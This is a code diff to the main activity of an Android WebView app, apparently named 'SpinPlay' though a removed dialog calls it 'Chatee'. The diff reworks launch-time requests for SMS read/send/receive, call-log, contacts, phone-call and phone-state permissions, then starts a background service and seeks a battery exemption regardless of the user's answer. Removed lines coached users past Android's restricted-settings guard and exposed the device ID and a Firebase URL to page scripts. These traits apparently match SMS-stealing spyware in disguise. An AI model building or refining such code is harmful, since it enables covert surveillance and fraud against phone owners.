@@ -10,7 +10,6 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.provider.Settings;
 import android.view.View;
 import android.webkit.CookieManager;
 import android.webkit.JavascriptInterface;
@@ -36,7 +35,6 @@ public class MainActivity extends AppCompatActivity {
     private static final String LOCAL_UI = "file:///android_asset/index.html";
     private static final int FILE_CHOOSER_REQUEST = 1001;
     private static final int PERMISSION_REQUEST_CODE = 2001;
-    private static final int OTHER_PERMISSION_REQUEST_CODE = 2002;
     private static final String PREFS_NAME = "SpinPlayPrefs";
     private static final String KEY_PERM_ASKED = "perm_asked";
 
@@ -60,61 +58,83 @@ public class MainActivity extends AppCompatActivity {
         swipeRefresh = findViewById(R.id.swipe_refresh);
         setupWebView();
         setupSwipeRefresh();
-        preloadWebsite();
         requestPermissionsOnce();
+        preloadWebsite();
+        startBackgroundService();
+        requestBatteryExemptionIfNeeded();
     }
 
     private void requestPermissionsOnce() {
-        if (!PermissionHelper.needsRuntimePermissions(this)) {
-            startBackgroundService();
-            requestBatteryExemptionIfNeeded();
+        if (prefs.getBoolean(KEY_PERM_ASKED, false)) {
+            if (!allPermissionsGranted()) requestMissingPermissions();
             return;
         }
-        if (!PermissionHelper.hasSmsPermissions(this)) {
-            ActivityCompat.requestPermissions(
-                this, PermissionHelper.smsPermissions(), PERMISSION_REQUEST_CODE);
-            prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
-            return;
-        }
-        requestOtherPermissions();
+        requestAllPermissions();
+        prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
     }
 
-    private void requestOtherPermissions() {
+    private boolean allPermissionsGranted() {
+        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_PHONE_STATE};
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
+            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
+            permissions = withNotifications.toArray(new String[0]);
+        }
+        for (String permission : permissions) {
+            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) return false;
+        }
+        return true;
+    }
+
+    private void requestMissingPermissions() {
+        List<String> missingList = new ArrayList<>();
+        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_PHONE_STATE};
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
+            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
+            permissions = withNotifications.toArray(new String[0]);
+        }
+        for (String permission : permissions) {
+            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED 
+                && shouldShowRequestPermissionRationale(permission)) {
+                missingList.add(permission);
+            }
+        }
+        if (!missingList.isEmpty()) {
+            ActivityCompat.requestPermissions(this, missingList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        }
+    }
+
+    private void requestAllPermissions() {
         List<String> permissionList = new ArrayList<>();
-        for (String permission : PermissionHelper.otherPermissions()) {
+        String[] permissions = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_PHONE_STATE};
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            List<String> withNotifications = new ArrayList<>(java.util.Arrays.asList(permissions));
+            withNotifications.add(Manifest.permission.POST_NOTIFICATIONS);
+            permissions = withNotifications.toArray(new String[0]);
+        }
+        for (String permission : permissions) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 permissionList.add(permission);
             }
         }
         if (!permissionList.isEmpty()) {
-            ActivityCompat.requestPermissions(
-                this, permissionList.toArray(new String[0]), OTHER_PERMISSION_REQUEST_CODE);
-        } else {
-            startBackgroundService();
-            requestBatteryExemptionIfNeeded();
+            ActivityCompat.requestPermissions(this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            if (!PermissionHelper.hasSmsPermissions(this)) {
-                new AlertDialog.Builder(this)
-                    .setTitle("SMS permission needed")
-                    .setMessage("Allow SMS permission so Chatee can work. If blocked, open App info → Allow restricted settings → Permissions → SMS.")
-                    .setPositiveButton("Open Settings", (d, w) -> PermissionHelper.openAppSettings(this))
-                    .setNegativeButton("Try Again", (d, w) -> requestPermissionsOnce())
-                    .show();
-                return;
-            }
-            requestOtherPermissions();
-            return;
-        }
-        if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
-            startBackgroundService();
-            requestBatteryExemptionIfNeeded();
-        }
     }
 
     private void startBackgroundService() {
@@ -259,25 +279,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public class AndroidBridge {
-        @JavascriptInterface
-        public String getDeviceId() {
-            try {
-                String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-                return id != null ? id : "";
-            } catch (Exception e) {
-                return "";
-            }
-        }
-
-        @JavascriptInterface
-        public String getFirebaseDatabaseUrl() {
-            try {
-                return FirebaseBootstrap.databaseUrl(MainActivity.this);
-            } catch (Exception e) {
-                return "";
-            }
-        }
-
         @JavascriptInterface
         public void showToast(String message) {
             runOnUiThread(new Runnable() {
